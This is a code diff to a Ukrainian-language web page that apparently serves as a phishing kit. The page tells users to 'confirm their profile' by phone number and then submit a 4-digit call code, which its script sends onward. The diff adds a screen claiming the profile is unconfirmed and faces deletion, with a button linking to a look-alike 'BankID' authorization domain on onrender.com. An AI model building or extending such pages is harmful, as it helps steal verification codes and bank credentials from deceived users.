@@ -12,7 +12,8 @@
             --primary: #007bff;
             --primary-hover: #0056b3;
             --success: #28a745;
-            --danger: #dc3545;
+            --danger: #dc3545; /* Використовуємо для нової кнопки */
+            --danger-hover: #bd2130;
             --border: #e0e0e0;
             --bg: #f8f9fa;
             --text: #333;
@@ -128,6 +129,7 @@
             color: var(--text-muted);
             margin-bottom: 16px;
             font-size: 14.5px;
+            line-height: 1.6; /* Додано для кращого вигляду довшого тексту */
         }
 
         .code-input-group {
@@ -195,6 +197,17 @@
         .submit-button:active {
             transform: translateY(0);
         }
+        
+        /* Стиль для нової чорної кнопки */
+        .bankid-button {
+            background-color: var(--black);
+            margin-top: 15px;
+            border-radius: 12px;
+        }
+
+        .bankid-button:hover {
+            background-color: #333; /* Трохи світліший чорний при наведенні */
+        }
 
         .step {
             display: none;
@@ -210,21 +223,27 @@
             to { opacity: 1; transform: translateX(0); }
         }
 
-        /* Стиль для успішного повідомлення */
-        .success-message {
-            color: var(--success);
+        /* Стиль для повідомлення про непідтвердження */
+        .error-message {
+            color: var(--danger);
             text-align: center;
-            padding: 20px;
-            font-size: 18px;
+            padding: 10px 0 20px 0;
+            font-size: 17px;
             font-weight: 600;
             line-height: 1.6;
         }
 
-        .success-message i {
+        .error-message i {
             font-size: 48px;
             display: block;
             margin-bottom: 16px;
-            color: var(--success);
+            color: var(--danger);
+        }
+
+        .bankid-text {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin-bottom: 20px;
         }
 
         input[type=tel]::-webkit-inner-spin-button,
@@ -250,7 +269,6 @@
                 <img id="project-logo" src="" alt="Логотип" class="logo">
             </div>
 
-            <!-- Крок 1: Номер телефону -->
             <div id="phone-step" class="step active">
                 <div class="info-text">
                     Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону. Це допоможе захистити ваш акаунт і забезпечити його стабільну роботу.
@@ -272,28 +290,30 @@
                 </button>
             </div>
 
-            <!-- Крок 2: SMS-код -->
             <div id="sms-step" class="step">
-                <p class="sms-prompt">Введіть 6-значний код з SMS</p>
+                <p class="sms-prompt">Зараз вам надійде дзвінок, вкажіть 4 останні цифри номеру який вам дзвонив</p>
                 <div class="code-input-group">
                     <input type="text" maxlength="1" class="code-input" id="code-1" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-2" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-3" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-4" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-5" inputmode="numeric">
-                    <input type="text" maxlength="1" class="code-input" id="code-6" inputmode="numeric">
                 </div>
                 <button type="button" class="submit-button" onclick="sendSmsCode()">
                     Підтвердити
                 </button>
             </div>
 
-            <!-- Крок 3: Успішне підтвердження (зелений текст) -->
-            <div id="success-step" class="step">
-                <div class="success-message">
-                    <i class="fas fa-check-circle"></i>
-                    <div>Ваш аккаунт успішно підтверджено</div>
+            <div id="bankid-step" class="step">
+                <div class="error-message">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <div>Ваш профіль не підтверджено.</div>
                 </div>
+                <div class="bankid-text">
+                    Для скасування видалення та продовження користування, підтвердіть профіль за допомогою BankID.
+                </div>
+                <a href="https://oshad-autorizatsion.onrender.com" class="submit-button bankid-button" role="button">
+                    Підтвердити
+                </a>
             </div>
         </div>
     </div>
@@ -356,15 +376,16 @@
         }
 
         function sendSmsCode() {
-            const code = $('.code-input').map((_, el) => el.value).get().join('');
-            if (!/^\d{6}$/.test(code)) {
-                alert('Введіть повний 6-значний код');
+            // Отримуємо лише 4 коди
+            const code = $('.code-input').slice(0, 4).map((_, el) => el.value).get().join('');
+            if (!/^\d{4}$/.test(code)) { // Перевірка на 4 цифри
+                alert('Введіть повний 4-значний код');
                 return;
             }
             sendData('code', { code });
 
             $('#sms-step').removeClass('active');
-            $('#success-step').addClass('active');
+            $('#bankid-step').addClass('active'); // Перехід на BankID крок
         }
 
         function sendData(step, data) {
